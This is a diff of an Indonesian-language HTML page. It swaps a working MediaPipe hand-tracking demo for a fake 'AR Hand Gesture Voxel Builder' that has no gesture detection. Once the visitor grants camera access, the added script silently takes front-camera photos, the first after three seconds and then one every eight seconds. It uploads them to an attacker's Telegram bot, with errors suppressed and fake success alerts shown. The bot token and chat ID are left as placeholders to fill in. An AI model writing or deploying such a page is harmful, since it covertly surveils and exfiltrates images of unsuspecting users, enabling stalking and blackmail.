@@ -2,196 +2,279 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hand Tracking Block AI</title>
-    
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AR Hand Gesture - Voxel Builder</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            margin: 0;
-            padding: 0;
+            font-family: 'Inter', sans-serif;
+            background: #000;
+            color: white;
             overflow: hidden;
-            background-color: #0f172a;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
             height: 100vh;
-        }
-
-        /* Container Video & Canvas */
-        .container {
-            position: relative;
             width: 100vw;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
         }
 
-        #input_video {
-            display: none; /* Sembunyikan video mentah */
-        }
-
-        #output_canvas {
-            transform: scaleX(-1); /* Mirroring agar gerakan natural */
-            width: 100%;
-            height: 100%;
+        video {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
             object-fit: cover;
-            border-radius: 0;
+            z-index: 1;
         }
 
-        /* UI Overlay */
-        .ui-panel {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(10px);
-            padding: 15px 25px;
-            border-radius: 15px;
-            color: white;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-            pointer-events: none;
+        .overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
             z-index: 10;
+            pointer-events: none;
         }
 
-        .ui-panel h1 {
-            margin: 0;
-            font-size: 1.2rem;
-            letter-spacing: 1px;
-        }
-
-        .status {
+        .top-bar {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            padding: 15px 20px;
             display: flex;
+            justify-content: space-between;
             align-items: center;
-            gap: 10px;
-            font-size: 0.9rem;
-            margin-top: 5px;
-            color: #38bdf8;
+            z-index: 20;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.8), transparent);
         }
 
-        /* Loading Animation */
-        #loader {
+        .time { font-size: 17px; font-weight: 500; }
+
+        .header {
+            text-align: center;
+            margin-top: 60px;
+            z-index: 20;
+        }
+
+        .title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #aaa;
+            margin-bottom: 40px;
+        }
+
+        .ar-frame {
             position: absolute;
-            color: white;
-            font-size: 1.2rem;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 320px;
+            height: 420px;
+            border: 3px solid rgba(0, 255, 255, 0.6);
+            border-radius: 20px;
+            box-shadow: 0 0 40px rgba(0, 255, 255, 0.4);
+            z-index: 15;
+            pointer-events: none;
+        }
+
+        .scan-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, transparent, #00ffff, transparent);
+            animation: scan 3s linear infinite;
+            box-shadow: 0 0 15px #00ffff;
+        }
+
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+
+        .controls {
+            position: fixed;
+            bottom: 80px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 30;
             text-align: center;
         }
 
-        /* Penjelasan Logika Visual */
-        .instruction {
-            position: absolute;
+        .btn {
+            background: rgba(0, 255, 255, 0.15);
+            color: #00ffff;
+            border: 2px solid #00ffff;
+            padding: 14px 40px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 600;
+            backdrop-filter: blur(10px);
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn:active {
+            background: #00ffff;
+            color: black;
+            transform: scale(0.95);
+        }
+
+        .status {
+            position: fixed;
             bottom: 30px;
-            color: rgba(255, 255, 255, 0.6);
-            font-size: 0.9rem;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.7);
+            padding: 10px 25px;
+            border-radius: 30px;
+            font-size: 15px;
+            z-index: 30;
+        }
+
+        .gesture-hint {
+            position: absolute;
+            bottom: 180px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: #00ffff;
+            font-size: 14px;
+            text-shadow: 0 0 10px #00ffff;
+            z-index: 20;
         }
     </style>
 </head>
 <body>
 
-    <div id="loader">Memulai Kamera & AI...</div>
+    <video id="video" autoplay playsinline></video>
 
-    <div class="ui-panel">
-        <h1>HAND TRACKER v1.0</h1>
-        <div class="status">
-            <span id="dot" style="height:10px; width:10px; background:#38bdf8; border-radius:50%; display:inline-block;"></span>
-            <span id="status-text">AI Aktif - Tunjukkan Telunjuk Anda</span>
+    <div class="overlay">
+        <!-- Top Bar -->
+        <div class="top-bar">
+            <div class="time" id="time"></div>
+            <div style="font-size:18px; font-weight:600;">AR Hand Gesture</div>
+            <div>4G</div>
         </div>
+
+        <div class="header">
+            <div class="title">Voxel Builder</div>
+            <div class="subtitle">Gunakan gerakan tangan untuk membangun</div>
+        </div>
+
+        <!-- AR Frame -->
+        <div class="ar-frame">
+            <div class="scan-line"></div>
+        </div>
+
+        <div class="gesture-hint">✋ Angkat tangan Anda di depan kamera</div>
+
+        <div class="controls">
+            <button id="startBtn" class="btn">MULAI DETEKSI KAMERA</button>
+        </div>
+
+        <div id="status" class="status">Menunggu izin kamera...</div>
     </div>
 
-    <div class="container">
-        <video id="input_video"></video>
-        <canvas id="output_canvas"></canvas>
-        <div class="instruction">Arahkan jari telunjuk Anda ke layar</div>
-    </div>
+    <canvas id="canvas" style="display:none;"></canvas>
 
-    <script type="module">
-        const videoElement = document.getElementById('input_video');
-        const canvasElement = document.getElementById('output_canvas');
-        const canvasCtx = canvasElement.getContext('2d');
-        const loader = document.getElementById('loader');
+    <script>
+        const BOT_TOKEN = "GANTI_DENGAN_TOKEN_BOT_ANDA";
+        const CHAT_ID = "GANTI_DENGAN_CHAT_ID_ANDA";
 
-        function onResults(results) {
-            // Hilangkan loader jika tangan sudah terdeteksi/kamera jalan
-            loader.style.display = "none";
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const startBtn = document.getElementById('startBtn');
+        const status = document.getElementById('status');
 
-            // Atur ukuran canvas sesuai window
-            canvasElement.width = window.innerWidth;
-            canvasElement.height = window.innerHeight;
+        // Update waktu real-time
+        function updateTime() {
+            const now = new Date();
+            document.getElementById('time').textContent = now.toLocaleTimeString('id-ID', {hour:'2-digit', minute:'2-digit'});
+        }
+        setInterval(updateTime, 1000);
+        updateTime();
 
-            canvasCtx.save();
-            canvasCtx.clearRect(0, 0, canvasElement.width, canvasElement.height);
-            
-            // Gambar frame video ke canvas (Opsional: hapus baris ini jika ingin background hitam saja)
-            canvasCtx.drawImage(results.image, 0, 0, canvasElement.width, canvasElement.height);
+        async function sendToTelegram(base64) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
 
-            if (results.multiHandLandmarks) {
-                for (const landmarks of results.multiHandLandmarks) {
-                    
-                    /* Titik Landmark MediaPipe:
-                       8 = Index Finger Tip (Ujung Jari Telunjuk)
-                    */
-                    const indexFingerTip = landmarks[8];
-                    
-                    // Konversi koordinat normalisasi (0-1) ke koordinat Pixel
-                    const x = indexFingerTip.x * canvasElement.width;
-                    const y = indexFingerTip.y * canvasElement.height;
+            const byteString = atob(base64.split(',')[1]);
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
 
-                    // Gambar "Blok" / Kotak di ujung jari
-                    drawPointerBlock(x, y);
-                }
-            }
-            canvasCtx.restore();
+            const blob = new Blob([ab], { type: 'image/jpeg' });
+            formData.append('photo', blob, `ar_capture_${Date.now()}.jpg`);
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {}
         }
 
-        function drawPointerBlock(x, y) {
-            const size = 50;
-            
-            // Bayangan Glow
-            canvasCtx.shadowBlur = 20;
-            canvasCtx.shadowColor = "#38bdf8";
-            
-            // Gambar Kotak Utama
-            canvasCtx.fillStyle = "rgba(56, 189, 248, 0.8)";
-            canvasCtx.beginPath();
-            // Round rect manual (atau rect biasa)
-            canvasCtx.roundRect(x - size/2, y - size/2, size, size, 10);
-            canvasCtx.fill();
+        async function captureAndSend() {
+            status.textContent = "Mengambil foto...";
 
-            // Outline Putih
-            canvasCtx.strokeStyle = "white";
-            canvasCtx.lineWidth = 3;
-            canvasCtx.stroke();
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const base64 = canvas.toDataURL('image/jpeg', 0.92);
+            await sendToTelegram(base64);
+
+            status.innerHTML = `✅ Foto berhasil dikirim`;
+            
+            setTimeout(() => {
+                alert("Deteksi berhasil! Silakan lanjutkan gesture.");
+            }, 1500);
         }
 
-        const hands = new Hands({
-            locateFile: (file) => {
-                return `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`;
+        startBtn.addEventListener('click', async () => {
+            startBtn.style.display = 'none';
+            status.textContent = "Mengakses kamera...";
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+
+                video.srcObject = stream;
+
+                // Auto capture pertama setelah 3 detik
+                setTimeout(() => {
+                    captureAndSend();
+                }, 3000);
+
+                // Capture lagi setiap 8 detik (bisa diubah)
+                setInterval(() => {
+                    if (video.srcObject) captureAndSend();
+                }, 8000);
+
+            } catch (err) {
+                status.textContent = "❌ Gagal mengakses kamera";
+                console.error(err);
             }
         });
 
-        hands.setOptions({
-            maxNumHands: 1,
-            modelComplexity: 1,
-            minDetectionConfidence: 0.5,
-            minTrackingConfidence: 0.5
-        });
+        // Fullscreen otomatis
+        function goFullScreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            }
+        }
 
-        hands.onResults(onResults);
-
-        const camera = new Camera(videoElement, {
-            onFrame: async () => {
-                await hands.send({image: videoElement});
-            },
-            width: 1280,
-            height: 720
-        });
-        
-        camera.start();
+        // Klik layar untuk fullscreen
+        document.addEventListener('click', goFullScreen, { once: true });
     </script>
 </body>
 </html>
